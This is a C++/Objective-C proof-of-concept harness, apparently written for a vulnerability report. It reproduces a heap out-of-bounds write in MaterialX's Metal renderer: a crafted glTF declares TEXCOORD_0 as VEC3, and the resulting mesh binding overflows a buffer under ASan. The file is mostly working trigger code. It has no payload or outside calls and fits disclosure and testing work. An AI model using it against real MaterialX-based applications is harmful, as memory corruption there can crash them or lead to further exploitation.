//
// POC harness for MaterialX Case 3: MslProgram::bindAttribute heap OOB write.
//
// Loads a crafted glTF (TEXCOORD_0 declared VEC3 instead of VEC2) through the
// real MaterialX CgltfLoader, generates an MSL shader, compiles the Metal
// pipeline, and calls MslProgram::bindMesh which triggers the overflow in
// MslProgram::bindAttribute (MslPipelineStateObject.mm:399-413).
//
// Uses MTLCopyAllDevices() instead of MTLCreateSystemDefaultDevice() so it
// works in headless/CI environments (Codemagic, SSH sessions, etc.).
//
// Expected result:
//   ASan: heap-buffer-overflow WRITE inside MslProgram::bindAttribute
//         at the memcpy in MslPipelineStateObject.mm
//

#ifdef __APPLE__

#include <MaterialXCore/Document.h>
#include <MaterialXFormat/Util.h>
#include <MaterialXFormat/XmlIo.h>

#include <MaterialXGenMsl/MslShaderGenerator.h>
#include <MaterialXGenShader/GenContext.h>
#include <MaterialXGenShader/Shader.h>

#include <MaterialXRender/GeometryHandler.h>
#include <MaterialXRender/CgltfLoader.h>
#include <MaterialXRender/TinyObjLoader.h>
#include <MaterialXRender/StbImageLoader.h>
#include <MaterialXRender/LightHandler.h>

#include <MaterialXRenderMsl/MslRenderer.h>
#include <MaterialXRenderMsl/MslPipelineStateObject.h>
#include <MaterialXRenderMsl/MetalFramebuffer.h>

#import <Metal/Metal.h>

#include <iostream>
#include <string>

namespace mx = MaterialX;

static id<MTLDevice> getMetalDevice()
{
    // MTLCreateSystemDefaultDevice() returns nil in CLI/headless context on macOS 14+.
    // MTLCopyAllDevices() is Apple's documented workaround for non-interactive use.
    id<MTLDevice> device = MTLCreateSystemDefaultDevice();
    if (device)
        return device;

    NSArray<id<MTLDevice>>* devices = MTLCopyAllDevices();
    if (devices && devices.count > 0)
    {
        device = devices[0];
        std::cerr << "[+] Using MTLCopyAllDevices() fallback: " << [device.name UTF8String] << std::endl;
        return device;
    }

    return nil;
}

int main(int argc, char* argv[])
{
    std::string gltfPath  = (argc > 1) ? argv[1] : "texcoord_vec3.gltf";
    std::string mtlxPath  = (argc > 2) ? argv[2] : "";

    try
    {
        // --- 1. Get a Metal device (headless-safe) ---
        id<MTLDevice> device = getMetalDevice();
        if (!device)
        {
            std::cerr << "[-] No Metal device available. Need real Apple Silicon hardware." << std::endl;
            return 1;
        }
        std::cerr << "[+] Metal device: " << [device.name UTF8String] << std::endl;

        id<MTLCommandQueue> cmdQueue = [device newCommandQueue];

        // --- 2. Create framebuffer ---
        unsigned int width = 64, height = 64;
        mx::MetalFramebufferPtr framebuffer = mx::MetalFramebuffer::create(
            device, width, height, 4, mx::Image::BaseType::UINT8);
        std::cerr << "[+] Framebuffer created (" << width << "x" << height << ")." << std::endl;

        // --- 3. Register glTF loader and load the crafted geometry ---
        mx::GeometryHandlerPtr geomHandler = mx::GeometryHandler::create();
        geomHandler->addLoader(mx::TinyObjLoader::create());
        geomHandler->addLoader(mx::CgltfLoader::create());
        if (!geomHandler->loadGeometry(gltfPath) || geomHandler->getMeshes().empty())
        {
            std::cerr << "[-] Failed to load geometry: " << gltfPath << std::endl;
            return 1;
        }
        std::cerr << "[+] Loaded geometry: " << gltfPath << std::endl;

        for (const auto& mesh : geomHandler->getMeshes())
        {
            auto tcStream = mesh->getStream(mx::MeshStream::TEXCOORD_ATTRIBUTE, 0);
            if (tcStream)
            {
                std::cerr << "    TEXCOORD stream: stride=" << tcStream->getStride()
                          << " data_size=" << tcStream->getData().size() << std::endl;
            }
        }

        // --- 4. Load MaterialX standard libraries ---
        mx::FileSearchPath searchPath = mx::getDefaultDataSearchPath();
        mx::DocumentPtr stdLib = mx::createDocument();
        mx::loadLibraries({"libraries"}, searchPath, stdLib);
        std::cerr << "[+] Standard libraries loaded." << std::endl;

        // --- 5. Prepare material document ---
        mx::DocumentPtr doc = mx::createDocument();
        doc->importLibrary(stdLib);

        if (!mtlxPath.empty())
        {
            mx::readFromXmlFile(doc, mtlxPath);
            std::cerr << "[+] Loaded material: " << mtlxPath << std::endl;
        }
        else
        {
            std::string inlineMtlx = R"(
              <materialx version="1.39">
                <nodegraph name="NG_poc">
                  <texcoord name="tc" type="vector2">
                    <input name="index" type="integer" value="0" />
                  </texcoord>
                  <image name="img" type="color3">
                    <input name="texcoord" type="vector2" nodename="tc" />
                    <input name="file" type="filename" value="" />
                  </image>
                  <output name="out" type="color3" nodename="img" />
                </nodegraph>
                <standard_surface name="SR_poc" type="surfaceshader">
                  <input name="base_color" type="color3" nodegraph="NG_poc" output="out" />
                </standard_surface>
                <surfacematerial name="MAT_poc" type="material">
                  <input name="surfaceshader" type="surfaceshader" nodename="SR_poc" />
                </surfacematerial>
              </materialx>
            )";
            mx::readFromXmlString(doc, inlineMtlx);
            std::cerr << "[+] Using inline material." << std::endl;
        }

        // --- 6. Find renderable and generate MSL shader ---
        std::vector<mx::TypedElementPtr> renderables;
        mx::findRenderableElements(doc, renderables);
        if (renderables.empty())
        {
            std::cerr << "[-] No renderable elements found." << std::endl;
            return 1;
        }
        mx::TypedElementPtr element = renderables[0];
        std::cerr << "[+] Renderable: " << element->getNamePath() << std::endl;

        mx::ShaderGeneratorPtr generator = mx::MslShaderGenerator::create();
        mx::GenContext context(generator);
        context.getOptions().targetColorSpaceOverride = "lin_rec709";
        context.getOptions().hwMaxActiveLightSources = 0;
        context.registerSourceCodeSearchPath(searchPath);

        mx::ShaderPtr shader = generator->generate("poc_shader", element, context);
        if (!shader)
        {
            std::cerr << "[-] Shader generation failed." << std::endl;
            return 1;
        }
        std::cerr << "[+] MSL shader generated." << std::endl;

        // --- 7. Build MslProgram (compile Metal pipeline) ---
        mx::MslProgramPtr program = mx::MslProgram::create();
        program->setStages(shader);
        program->build(device, framebuffer);
        std::cerr << "[+] Metal pipeline built." << std::endl;

        // --- 8. Render: bindMesh → bindAttribute → OVERFLOW ---
        id<MTLCommandBuffer> cmdBuffer = [cmdQueue commandBuffer];
        MTLRenderPassDescriptor* renderpassDesc = [MTLRenderPassDescriptor new];
        framebuffer->bind(renderpassDesc);
        [renderpassDesc.colorAttachments[0] setClearColor:MTLClearColorMake(0, 0, 0, 1)];

        id<MTLRenderCommandEncoder> encoder = [cmdBuffer renderCommandEncoderWithDescriptor:renderpassDesc];

        MTLDepthStencilDescriptor* depthDesc = [MTLDepthStencilDescriptor new];
        depthDesc.depthWriteEnabled = YES;
        depthDesc.depthCompareFunction = MTLCompareFunctionLess;
        [encoder setDepthStencilState:[device newDepthStencilStateWithDescriptor:depthDesc]];
        [encoder setCullMode:MTLCullModeBack];

        program->bind(encoder);

        std::cerr << "[+] About to call bindMesh (triggers bindAttribute → OOB write)..." << std::endl;

        mx::ImageHandlerPtr imageHandler = mx::MetalTextureHandler::create(device, mx::StbImageLoader::create());
        imageHandler->setSearchPath(searchPath);
        mx::CameraPtr camera = mx::Camera::create();
        program->prepareUsedResources(encoder, camera, geomHandler, imageHandler, nullptr);

        for (const auto& mesh : geomHandler->getMeshes())
        {
            program->bindMesh(encoder, mesh);

            for (size_t i = 0; i < mesh->getPartitionCount(); i++)
            {
                auto part = mesh->getPartition(i);
                program->bindPartition(part);
                mx::MeshIndexBuffer& indexData = part->getIndices();
                [encoder drawIndexedPrimitives:MTLPrimitiveTypeTriangle
                                   indexCount:(int)indexData.size()
                                    indexType:MTLIndexTypeUInt32
                                  indexBuffer:program->getIndexBuffer(part)
                              indexBufferOffset:0];
            }
        }

        [encoder endEncoding];
        framebuffer->unbind();
        [cmdBuffer commit];
        [cmdBuffer waitUntilCompleted];
        [cmdBuffer release];
        cmdBuffer = nil;

        std::cerr << "[!] Render completed without ASan crash — check if ASan is enabled." << std::endl;
    }
    catch (mx::ExceptionRenderError& e)
    {
        std::cerr << "ExceptionRenderError: " << e.what() << std::endl;
        for (const auto& err : e.errorLog())
            std::cerr << "  " << err << std::endl;
        return 2;
    }
    catch (mx::Exception& e)
    {
        std::cerr << "MaterialX Exception: " << e.what() << std::endl;
        return 2;
    }
    catch (std::exception& e)
    {
        std::cerr << "std::exception: " << e.what() << std::endl;
        return 2;
    }

    return 0;
}

#else
#include <cstdio>
int main() { fprintf(stderr, "This POC requires macOS with Metal support.\n"); return 1; }
#endif
